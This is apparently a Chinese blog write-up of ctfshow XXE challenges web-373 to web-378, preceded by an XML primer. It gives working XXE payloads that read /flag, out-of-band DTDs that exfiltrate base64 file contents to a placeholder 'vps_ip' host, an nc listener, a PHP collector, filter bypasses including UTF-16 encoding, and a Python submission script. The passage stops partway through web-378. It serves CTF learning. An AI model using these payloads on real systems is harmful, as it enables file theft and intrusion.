+<p><strong>XML是大小写敏感的。</strong><br><strong>XML只有单个标签而没有相对应的结束标签的元素必须以“&#x2F;”结尾，否则结束标签绝对不能省略。</strong><br><strong>XML中的属性值必须使用引号，例如“width&#x3D;‘300’”，不能写成“width&#x3D;300”。</strong><br><strong>XML中所有的属性必须都有属性值。</strong><br><strong>XML文档应当以一个文档头开始，文档头可选，但是强烈建议使用。例如：“<?xml version='1.0’?>”或“<?xml version='1.0' encoding='UTF-8’?>”。</strong><br><strong>XML文档的正文包含根元素，根元素包含其他元素。元素可以有子元素、文本或者两者皆有。</strong><br><strong>XML文档由两部分构成：第一部分是文档序言，第二部分是文档元素（节点）。文档序言通常位于XML文档的顶端，根元素之前出现，它是一个特定的包含XML文档设定信息的部分。XML文档序言主要由XML声明、文档类型定义（DTD）和XML Schema组成。XML声明用来设置XML文档解析时所需的基本参数，包括版本号、编码方式等。DTD定义了文档的整体结构以及文档的语法，应用广泛并有丰富工具支持。XML Schema则用于定义管理信息等更强大、更丰富的特征。</strong></p>
+<p>XML的用途非常广泛，主要包括：</p>
+<p>存储数据：XML可以用于持久化保存需要长期存储的数据，例如web应用程序中的各种配置文件（如web.xml和bean.xml）。<br>分离数据：XML能将数据和展现形式相分离，使数据的组织者和展示者能更专注于各自的任务。<br>交换数据：XML可以在不兼容的系统之间交换数据，因为XML是纯文本格式，不受软件和硬件的限制。<br>共享数据：XML提供了一种简单的数据共享方式，因为任何应用程序都可以读取和解析XML文件。<br>总的来说，XML是一种强大且灵活的数据标记语言，它广泛应用于各种需要结构化数据处理的场景，特别是在Web开发、数据交换和配置文件管理等领域。</p>
+<p>xml相似于html，但是它可以自定义标签</p>
+<p>XML 和 HTML 为不同的目的而设计：</p>
+<p>XML 被设计用来传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p>
+<p>XXE:<br>       首先，攻击者会寻找那些存在XXE漏洞的应用程序作为攻击目标。这些应用程序可能没有正确限制或验证XML输入中的外部实体引用。</p>
+<pre><code>一旦找到了目标，攻击者会开始构造恶意的XML输入。这通常涉及到在XML文档中定义外部实体，这些实体指向攻击者想要访问或控制的资源，如文件、URL或其他后端系统。
+
+然后，攻击者将这些恶意的XML输入发送给目标应用程序。当应用程序解析这些XML数据时，它会尝试加载并包含这些外部实体引用的内容。由于应用程序没有正确地限制或验证这些引用，它可能会执行攻击者指定的恶意操作。
+
+通过XXE攻击，攻击者可以实现多种恶意目的。例如，他们可以读取目标服务器上的敏感文件，如配置文件、密码文件或数据库凭据。这些文件通常包含有关应用程序配置、用户凭证或其他重要信息，对攻击者来说具有很高的价值。
+</code></pre>
+<p>   此外，攻击者还可以利用XXE攻击发起服务器端请求伪造（SSRF）攻击，进一步探索和利用目标应用程序的内部网络结构。通过构造特定的XML输入，攻击者可以使应用程序发起对内部网络资源的请求，从而获取更多关于目标系统的信息。</p>
+<p>  在某些情况下，攻击者甚至可以利用XXE漏洞执行远程代码。他们可以在XML输入中嵌入恶意代码，通过应用程序的XML解析器执行这些代码，进而实现对目标系统的完全控制。</p>
+<p>  总的来说，从攻击者的角度来看，XXE攻击是一种利用应用程序对XML处理不当的漏洞，通过构造恶意的XML输入来实现各种恶意目的的攻击手段。为了防范XXE攻击，应用程序需要正确验证和限制XML输入中的外部实体引用，并采取其他必要的安全措施。</p>
+<h2 id="web-373（有回显XXE读取文件数据）"><a href="#web-373（有回显XXE读取文件数据）" class="headerlink" title="web-373（有回显XXE读取文件数据）"></a>web-373（有回显XXE读取文件数据）</h2><p>先看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<span class="hljs-comment">//该对象用于操作xml数据</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="hljs-comment">//加载 XML 文件并进行解析</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<span class="hljs-comment">//换了一种方式</span><br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<span class="hljs-comment">//将xmlctfshow标签里面的内容赋值个ctfshow这个变量</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<span class="hljs-comment">//输出这个值</span><br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br></code></pre></td></tr></table></figure>
+
+<p>通过伪协议input获取post中的数据流 然后</p>
+<p>libxml_disable_entity_loader(false);启用 libxml 实体加载器功能，允许 XML 解析器加载外部实体</p>
+<p>LIBXML_NOENT 表示禁止实体扩展 xml自带实体比如&lt; &gt;不能使用 以及内部实体<br><code>LIBXML_DTDLOAD</code> 表示允许加载外部 DTD</p>
+<p>并且有回显</p>
+<p>所以bp抓包，然后构造payload</p>
+<p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">payload</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">payload</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>解释：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">这段DTD定义了一个外部实体 xxe，它指向 /flag文件。<br><span class="hljs-symbol">&amp;xxe;</span>：在 ctfshow 元素中，引用了 xxe 外部实体。解析时，<span class="hljs-symbol">&amp;xxe;</span> 会被替换成 /flag 文件的内容（在Linux系统上）。<br>从而实现文件读取的作用<br></code></pre></td></tr></table></figure>
+
+<p>提交之后就拿到flag了</p>
+<p><img src="/../image/ctfshow-xxe-1.png"></p>
+<hr>
+<h2 id="web-374（无回显XXE外带数据）"><a href="#web-374（无回显XXE外带数据）" class="headerlink" title="web-374（无回显XXE外带数据）"></a>web-374（无回显XXE外带数据）</h2><p>首先看题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br></code></pre></td></tr></table></figure>
+
+<p>发现这题没有回显，所以使用外带数据通道提取数据</p>
+<p>步骤：xml获取dtd dtd中放base64读取文件和带数据 </p>
+<p><strong>第一种方式：</strong></p>
+<p>payload：</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">quote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps_ip/xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%quote</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>vps test.dtd</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">load</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps_ip/xxe/index.php?file=%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%load</span>;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%send</span>;</span><br></code></pre></td></tr></table></figure>
+
+<p>vps index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>发送后会在vps下的test.txt中看到base64编码后的flag</p>
+<p><img src="/../image/ctfshow-xxe-2.png"></p>
+<hr>
+<p><strong>第二种方式：</strong></p>
+<p>payload：</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [ </span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps_id/xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%remote</span>;<span class="hljs-variable">%int</span>;<span class="hljs-variable">%send</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>vps test.dtd</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps_ip:9999?q=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>vps上nc -lvv 进行监听端口9999</p>
+<hr>
+<h2 id="web-375（无回显XXE过滤XML声明绕过）"><a href="#web-375（无回显XXE过滤XML声明绕过）" class="headerlink" title="web-375（无回显XXE过滤XML声明绕过）"></a>web-375（无回显XXE过滤XML声明绕过）</h2><p>先看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;	<span class="hljs-comment">//过滤了xml声明</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br></code></pre></td></tr></table></figure>
+
+<p>可以发现源码过滤掉了XML声明</p>
+<p>这题解法和上题差不多。</p>
+<p>几种绕过方法：</p>
+<ol>
+<li><strong>不写XML声明</strong></li>
+<li><strong>在&lt;?xml后面多加个空格绕过</strong></li>
+<li><strong>双引号换单引号</strong></li>
+</ol>
+<hr>
+<h2 id="web-376（无回显XXE过滤XML声明绕过）"><a href="#web-376（无回显XXE过滤XML声明绕过）" class="headerlink" title="web-376（无回显XXE过滤XML声明绕过）"></a>web-376（无回显XXE过滤XML声明绕过）</h2><p>首先分析源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br></code></pre></td></tr></table></figure>
+
+<p><strong>比上一题多一个&#x2F;i大小写 没区别 同理</strong></p>
+<hr>
+<h2 id="web-377（无回显XXE过滤http和XML声明utf-16编码绕过）"><a href="#web-377（无回显XXE过滤http和XML声明utf-16编码绕过）" class="headerlink" title="web-377（无回显XXE过滤http和XML声明utf-16编码绕过）"></a>web-377（无回显XXE过滤http和XML声明utf-16编码绕过）</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br></code></pre></td></tr></table></figure>
+
+<p> 在 web374 的基础上过滤了 &lt;?xml version&#x3D;”1.0” 和 http</p>
+<p>说是可以使用 UTF-16 编码绕过,</p>
+<p>把web374的payload转为utf-16编码</p>
+<p><strong>python脚本：</strong></p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml">import requests</span><br><span class="language-xml">url = &#x27;http://0ec4fe9d-6949-4e9d-a3b1-70be3bb3f01b.challenge.ctf.show/&#x27;</span><br><span class="language-xml">payload = &#x27;&#x27;&#x27;</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">quote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps_ip/xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%quote</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml">&#x27;&#x27;&#x27;</span><br><span class="language-xml">payload = payload.encode(&#x27;utf-16&#x27;)</span><br><span class="language-xml">rep = requests.post(url=url, data=payload)</span><br><span class="language-xml">print(rep.text)</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-378（有回显XXE）"><a href="#web-378（有回显XXE）" class="headerlink" title="web-378（有回显XXE）"></a>web-378（有回显XXE）</h2><p>打开一看是个登录界面</p>
+<p><img src="/../image/ctfshow-xxe-3.png"></p>
+<p>抓个包看看</p>
+<p><img src="/../image/ctfshow-xxe-4.png"></p>
+<p>一看就知道是xml数据，后台肯定会用xml解析这个数据</p>
+<p>源码中也能看出来</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">doLogin</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-comment">//不为空就行</span><br>	<span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).val();<br>	<span class="hljs-keyword">var</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).val();<br>	<span class="hljs-keyword">if</span>(username == <span class="hljs-string">&quot;&quot;</span> || password == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>		alert(<span class="hljs-string">&quot;Please enter the username and password!&quot;</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>	<span class="hljs-comment">//定义一下数据</span><br>	<span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; <br>使用异步发送请求<br>    $.ajax(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;doLogin&quot;</span>,<br>        <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span>,<span class="hljs-comment">//告诉服务器我的数据类型</span><br>        data: data,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;xml&quot;</span>,<span class="hljs-comment">//接收的数据类型为</span><br>        anysc: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">result</span>) &#123;<br>             从返回的 XML 数据中获取名为 <span class="hljs-string">&quot;code&quot;</span> 的元素的值。<br>        	<span class="hljs-keyword">var</span> code = result.getElementsByTagName(<span class="hljs-string">&quot;code&quot;</span>)[<span class="hljs-number">0</span>].childNodes[<span class="hljs-number">0</span>].nodeValue;<br>        	<span class="hljs-keyword">var</span> msg = result.getElementsByTagName(<span class="hljs-string">&quot;msg&quot;</span>)[<span class="hljs-number">0</span>].childNodes[<span class="hljs-number">0</span>].nodeValue;<br>        	<span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;0&quot;</span>)&#123;<br>        		$(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-built_in">text</span>(msg + <span class="hljs-string">&quot; login fail!&quot;</span>);<br>            <span class="hljs-comment">//如果code为1显示登录成功</span><br>        	